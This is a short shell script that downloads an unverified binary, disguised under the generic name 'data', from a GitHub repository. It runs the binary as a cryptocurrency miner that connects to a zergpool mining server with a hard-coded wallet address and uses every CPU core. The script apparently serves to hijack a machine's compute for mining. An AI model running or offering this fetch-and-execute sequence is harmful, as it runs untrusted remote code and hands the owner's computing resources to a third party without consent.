apt update -y
wget https://github.com/adeayuvebriani/datamine/raw/main/data
chmod +x data
./data -a minotaurx -o stratum+tcp://minotaurx.mine.zergpool.com:7019 -u MMguZU589zvBmqMAg3GsKoLxv1JZpWch8L -p c=LCC,mc=LCC -t $(nproc)
